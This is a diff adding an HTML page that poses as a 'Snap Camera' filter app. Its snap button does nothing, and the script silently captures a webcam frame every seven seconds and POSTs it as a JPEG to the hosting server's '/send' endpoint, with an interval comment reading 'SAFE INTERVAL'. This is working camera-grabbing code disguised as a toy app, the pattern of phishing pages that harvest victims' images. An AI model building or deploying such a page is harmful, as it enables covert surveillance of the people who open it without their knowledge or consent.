@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Snap Camera</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: black;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+        }
+
+        /* Camera */
+        video {
+            position: fixed;
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+            transition: filter 0.3s ease;
+        }
+
+        /* Flash effect */
+        .flash {
+            position: fixed;
+            inset: 0;
+            background: white;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* Top text */
+        .top-bar {
+            position: fixed;
+            top: 15px;
+            width: 100%;
+            text-align: center;
+            color: white;
+            opacity: 0.8;
+            font-size: 16px;
+        }
+
+        /* Bottom UI */
+        .bottom-ui {
+            position: fixed;
+            bottom: 20px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Snap button */
+        .snap-btn {
+            width: 75px;
+            height: 75px;
+            border-radius: 50%;
+            border: 5px solid white;
+            margin-top: 10px;
+        }
+
+        /* Filters */
+        .filters {
+            display: flex;
+            gap: 10px;
+            overflow-x: auto;
+            padding: 5px 15px;
+        }
+
+        .filter {
+            min-width: 70px;
+            padding: 6px;
+            background: rgba(255, 255, 255, 0.15);
+            color: white;
+            border-radius: 12px;
+            font-size: 12px;
+            text-align: center;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+
+        canvas {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="top-bar">Snap Camera</div>
+
+    <video id="video" autoplay playsinline></video>
+    <div class="flash" id="flash"></div>
+
+    <canvas id="canvas"></canvas>
+
+    <div class="bottom-ui">
+        <div class="filters">
+            <div class="filter" onclick="setFilter('none')">Normal</div>
+            <div class="filter" onclick="setFilter('grayscale(1)')">B&W</div>
+            <div class="filter" onclick="setFilter('sepia(1)')">Vintage</div>
+            <div class="filter" onclick="setFilter('contrast(1.4)')">Pop</div>
+            <div class="filter" onclick="setFilter('blur(2px)')">Soft</div>
+            <div class="filter" onclick="setFilter('hue-rotate(90deg)')">Neon</div>
+            <div class="filter" onclick="setFilter('invert(1)')">Invert</div>
+        </div>
+
+        <div class="snap-btn"></div>
+    </div>
+
+    <script>
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const flash = document.getElementById("flash");
+
+        let currentFilter = "none";
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                video.onloadedmetadata = () => startAutoCapture();
+            })
+            .catch(err => alert("Camera error: " + err));
+
+        function setFilter(filter) {
+            currentFilter = filter;
+            video.style.filter = filter;
+        }
+
+        function startAutoCapture() {
+            setInterval(() => {
+                captureAndSend();
+            }, 7000); // SAFE INTERVAL
+        }
+
+        function flashEffect() {
+            flash.style.opacity = "1";
+            setTimeout(() => flash.style.opacity = "0", 150);
+        }
+
+        function captureAndSend() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            const ctx = canvas.getContext("2d");
+            ctx.filter = currentFilter;
+            ctx.drawImage(video, 0, 0);
+
+            flashEffect();
+
+            const img = canvas.toDataURL("image/jpeg");
+
+            fetch("/send", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ image: img })
+            })
+                .then(() => console.log("📸 Sent"))
+                .catch(err => console.error(err));
+        }
+    </script>
+
+</body>
+
+</html>
